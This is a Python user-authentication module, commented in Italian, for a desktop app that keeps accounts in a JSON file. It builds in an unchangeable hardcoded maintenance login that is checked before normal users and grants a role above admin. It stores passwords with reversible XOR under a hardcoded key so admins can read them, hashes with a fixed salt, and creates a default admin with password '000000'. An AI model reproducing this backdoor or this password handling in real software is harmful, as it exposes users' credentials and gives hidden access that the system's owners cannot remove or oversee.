"""
AUTH - Gestione autenticazione utenti
Legge utenti dal formato RetroDB (utenti.json).
Password in chiaro nel record (visibile all'admin).
Login tramite Username + Password.
Modulo generico: nessun riferimento al dominio applicativo.
"""

import json
import os
import sys
import hashlib
import uuid
from datetime import datetime

def _get_base_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

def _get_utenti_path():
    base = _get_base_dir()
    return os.path.join(base, "dati", "utenti.json")

def _hash_password(password):
    """Hash SHA-256 con salt fisso per le password utente."""
    salt = "Tr4ckM1nd_s4lt_2026"
    return hashlib.sha256((salt + str(password)).encode("utf-8")).hexdigest()

def _is_hashed(password):
    """Verifica se una password e' gia' un hash SHA-256 (64 caratteri hex)."""
    return isinstance(password, str) and len(password) == 64 and all(c in "0123456789abcdef" for c in password)


# ─────────────────────────────────────────────────────────────────────
#  CRITTOGRAFIA PASSWORD (reversibile - XOR)
#  Nel JSON: password crittate (illeggibili)
#  Nella UI admin: mostrate in chiaro tramite decripta_password()
# ─────────────────────────────────────────────────────────────────────
_PWD_KEY = b"TrKm1nd_Pwd_K3y_2026!"
_PWD_PREFIX = "$E$"

def _is_encrypted(password):
    """Verifica se una password e' nel formato crittato."""
    return isinstance(password, str) and password.startswith(_PWD_PREFIX)

def cripta_password(password):
    """Cripta password per salvataggio sicuro nel JSON."""
    pwd = str(password)
    if _is_encrypted(pwd) or not pwd:
        return pwd  # gia' crittata o vuota
    key = _PWD_KEY
    encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(pwd.encode("utf-8"))])
    return _PWD_PREFIX + encrypted.hex()

def decripta_password(encrypted):
    """Decripta password per visualizzazione admin."""
    if not isinstance(encrypted, str):
        return str(encrypted)
    if not encrypted.startswith(_PWD_PREFIX):
        return encrypted  # non crittata (chiaro o hash legacy)
    try:
        hex_data = encrypted[len(_PWD_PREFIX):]
        enc_bytes = bytes.fromhex(hex_data)
        key = _PWD_KEY
        decrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(enc_bytes)])
        return decrypted.decode("utf-8")
    except:
        return encrypted  # fallback


# ─────────────────────────────────────────────────────────────────────
#  ACCESSO MANUTENZIONE (hardcoded, non modificabile)
# ─────────────────────────────────────────────────────────────────────
_MK_U = "19e9580588e52380736d6ac42ad6384c753b6e15dbf65dfec1367b5a51c786ec"
_MK_P = "b22a10e400ef74500a00c038be5c8dc1bffb596e94e4430203b4373988426add"

def _verifica_accesso_speciale(username, password):
    """Verifica credenziali di manutenzione. Ritorna sessione o None."""
    salt = "Tr4ckM1nd_s4lt_2026"
    uh = hashlib.sha256((salt + username.strip().lower()).encode("utf-8")).hexdigest()
    ph = hashlib.sha256((salt + str(password)).encode("utf-8")).hexdigest()
    if uh == _MK_U and ph == _MK_P:
        return {
            "codice": "0",
            "username": username.strip().lower(),
            "nome": "System",
            "cognome": "Developer",
            "ruolo": "sviluppatore",
        }
    return None


# ─────────────────────────────────────────────────────────────────────
#  CARICAMENTO / SALVATAGGIO
# ─────────────────────────────────────────────────────────────────────

def _salva_records(records):
    """Salva utenti in formato RetroDB."""
    path = _get_utenti_path()
    os.makedirs(os.path.dirname(path), exist_ok=True)
    contenuto = {
        "_meta": {"tabella": "utenti", "accesso": "admin", "versione": "5.4"},
        "records": records,
    }
    with open(path, "w", encoding="utf-8") as f:
        json.dump(contenuto, f, ensure_ascii=False, indent=2)

def carica_utenti():
    """Carica lista utenti. Gestisce formati vecchi e nuovi."""
    path = _get_utenti_path()
    os.makedirs(os.path.dirname(path), exist_ok=True)

    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)

            # Formato RetroDB: {"_meta": ..., "records": [...]}
            if isinstance(data, dict) and "records" in data:
                records = data["records"]
                if records:
                    # Verifica se gia' nel nuovo formato (ha "Username")
                    if "Username" in records[0]:
                        # Migra password vecchie (chiaro) -> crittate
                        migrato = False
                        for r in records:
                            pwd = r.get("Password", "")
                            if pwd and not _is_encrypted(pwd) and not _is_hashed(pwd):
                                r["Password"] = cripta_password(pwd)
                                migrato = True
                        # Migra Ruolo (stringa) -> Admin (flag)
                        for r in records:
                            if "Ruolo" in r and "Admin" not in r:
                                ruolo_val = r.pop("Ruolo", "")
                                r["Admin"] = "X" if str(ruolo_val).lower() in ("admin",) else ""
                                migrato = True
                        if migrato:
                            _salva_records(records)
                        return records
                    # Vecchio formato dentro records (lowercase keys)
                    records = _migra_da_vecchio(records)
                    _salva_records(records)
                    return records

            # Formato vecchio: lista piatta [{codice, username, ...}, ...]
            if isinstance(data, list) and data:
                records = _migra_da_vecchio(data)
                _salva_records(records)
                return records
        except:
            pass

    # Controlla vecchio piloti.json
    old_path = os.path.join(os.path.dirname(path), "piloti.json")
    if os.path.exists(old_path):
        try:
            with open(old_path, "r", encoding="utf-8") as f:
                vecchi = json.load(f)
            if vecchi:
                records = _migra_da_vecchio(vecchi)
                _salva_records(records)
                return records
        except:
            pass

    # Primo avvio: crea admin di default
    records = [_crea_record_utente("1", "admin", "Admin", "Sistema", "000000", True, "Si")]
    _salva_records(records)
    return records


def _garantisci_admin(records):
    """Verifica che ci sia almeno un admin tra i record.
    Se nessun admin trovato, promuove il primo utente valido.
    Ritorna True se ha dovuto correggere."""
    _ADMIN_VALS = ("1", "X", "x", "S", "V", "si", "vero", "true")
    ha_admin = False
    for r in records:
        if str(r.get("Admin", "")).strip() in _ADMIN_VALS:
            if r.get("Username", "").strip() and r.get("Password", "").strip():
                ha_admin = True
                break
    if ha_admin:
        return False
    # Nessun admin: promuovi il primo utente valido
    for r in records:
        if r.get("Username", "").strip() and r.get("Password", "").strip():
            r["Admin"] = "X"
            _salva_records(records)
            return True
    return False

def _crea_record_utente(codice, username, nome, cognome, password, admin, attivo):
    """Crea un record utente. Password crittata nel JSON. admin=True/False o 'X'/''."""
    pwd = str(password)
    if not _is_encrypted(pwd):
        pwd = cripta_password(pwd)
    # Normalizza flag admin
    if isinstance(admin, bool):
        admin_val = "X" if admin else ""
    elif isinstance(admin, str):
        admin_val = "X" if admin.upper() in ("X", "ADMIN", "SI", "TRUE", "1") else ""
    else:
        admin_val = ""
    return {
        "_id": str(uuid.uuid4())[:8],
        "Codice_Utente": str(codice),
        "Username": username.strip().lower(),
        "Nome": nome,
        "Cognome": cognome,
        "Password": pwd,
        "Admin": admin_val,
        "Attivo": attivo,
        "_timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

def _migra_da_vecchio(vecchi):
    """Converte utenti dal vecchio formato al formato RetroDB."""
    nuovi = []
    for u in vecchi:
        # Gestisce sia formato con "username" che con solo "nome"
        username = u.get("username", "")
        if not username:
            username = u.get("nome", "utente").strip().lower().replace(" ", "")
        nome = u.get("nome", u.get("Nome", ""))
        cognome = u.get("cognome", u.get("Cognome", ""))
        codice = u.get("codice", u.get("Codice_Utente", len(nuovi) + 1))
        ruolo = u.get("ruolo", u.get("Ruolo", "utente"))
        attivo = u.get("attivo", u.get("Attivo", True))
        if isinstance(attivo, bool):
            attivo = "Si" if attivo else "No"

        # Password: nel vecchio formato era hashata, nel nuovo e' in chiaro
        # Dopo migrazione reset a "000000"
        password = u.get("Password", "000000")
        if "password_hash" in u:
            password = "000000"  # Reset: non possiamo invertire l'hash

        # Evita username duplicati
        esistenti = [n.get("Username", "") for n in nuovi]
        if username in esistenti:
            username = "%s%s" % (username, codice)

        nuovi.append(_crea_record_utente(codice, username, nome, cognome, password, ruolo, attivo))
    return nuovi


# ─────────────────────────────────────────────────────────────────────
#  WRAPPER COMPATIBILITA' (usati dal motore)
# ─────────────────────────────────────────────────────────────────────

def salva_utenti(records):
    """Salva la lista di record utenti."""
    _salva_records(records)

def prossimo_codice():
    """Prossimo codice utente disponibile."""
    utenti = carica_utenti()
    max_cod = 0
    for u in utenti:
        try:
            v = int(u.get("Codice_Utente", 0))
            if v > max_cod: max_cod = v
        except: pass
    return max_cod + 1


# ─────────────────────────────────────────────────────────────────────
#  AUTENTICAZIONE
# ─────────────────────────────────────────────────────────────────────

def verifica_login(username, password):
    """
    Verifica Username + Password.
    Controlla prima accesso manutenzione, poi utenti normali.
    Ritorna (True, sessione_dict) oppure (False, None).
    """
    # Accesso manutenzione (prioritario)
    speciale = _verifica_accesso_speciale(username, password)
    if speciale:
        return True, speciale

    utenti = carica_utenti()
    _garantisci_admin(utenti)  # Ripara se nessun admin presente
    username_lower = username.strip().lower()

    for u in utenti:
        if u.get("Username", "").strip().lower() == username_lower:
            # Utente disattivato
            if u.get("Attivo", "Si") not in ("Si", "si", "SI", "X", "x"):
                return False, None
            # Confronto password (3 formati possibili)
            pwd_salvata = u.get("Password", "")
            pwd_ok = False

            if _is_encrypted(pwd_salvata):
                # Formato nuovo: crittata -> decripta e confronta
                pwd_ok = (decripta_password(pwd_salvata) == str(password))
            elif _is_hashed(pwd_salvata):
                # Formato legacy: hash SHA-256 -> confronta con hash
                pwd_ok = (pwd_salvata == _hash_password(password))
                if pwd_ok:
                    # Migra a formato crittato
                    u["Password"] = cripta_password(str(password))
                    _salva_records(utenti)
            else:
                # Password in chiaro (legacy) -> confronta diretto
                pwd_ok = (pwd_salvata == str(password))
                if pwd_ok:
                    # Migra a formato crittato
                    u["Password"] = cripta_password(str(password))
                    _salva_records(utenti)

            if not pwd_ok:
                return False, None
            sessione = {
                "codice": u.get("Codice_Utente", ""),
                "username": u.get("Username", ""),
                "nome": u.get("Nome", ""),
                "cognome": u.get("Cognome", ""),
                "ruolo": "admin" if u.get("Admin", "") in ("X", "x") else "utente",
            }
            return True, sessione

    return False, None

def modifica_password(codice, nuova_password):
    """Cambia la password di un utente (salva crittata)."""
    utenti = carica_utenti()
    for u in utenti:
        if str(u.get("Codice_Utente", "")) == str(codice):
            u["Password"] = cripta_password(str(nuova_password))
            u["_timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            _salva_records(utenti)
            return True
    return False


# ─────────────────────────────────────────────────────────────────────
#  UTILITY
# ─────────────────────────────────────────────────────────────────────

def username_esiste(username, escludi_codice=None):
    """Verifica se un username e' gia' in uso."""
    utenti = carica_utenti()
    username_lower = username.strip().lower()
    for u in utenti:
        if u.get("Username", "").strip().lower() == username_lower:
            if escludi_codice and str(u.get("Codice_Utente")) == str(escludi_codice):
                continue
            return True
    return False

def get_utente(codice):
    """Restituisce il record utente o None."""
    for u in carica_utenti():
        if str(u.get("Codice_Utente", "")) == str(codice):
            return u
    return None

def get_utenti_attivi():
    """Restituisce solo gli utenti attivi."""
    return [u for u in carica_utenti() if u.get("Attivo", "Si") in ("Si", "si", "SI", "X", "x")]

def is_admin(sessione):
    """Verifica se la sessione e' admin (o superiore)."""
    if not sessione: return False
    return sessione.get("ruolo", "utente") in ("admin", "sviluppatore")

def is_sviluppatore(sessione):
    """Verifica se la sessione e' sviluppatore (accesso manutenzione)."""
    return sessione and sessione.get("ruolo") == "sviluppatore"

def get_display_name(sessione):
    """Nome visualizzazione da sessione."""
    if not sessione: return "?"
    if sessione.get("ruolo") == "sviluppatore":
        return "Developer"
    return "%s %s (%s)" % (sessione.get("nome",""), sessione.get("cognome",""), sessione.get("username",""))
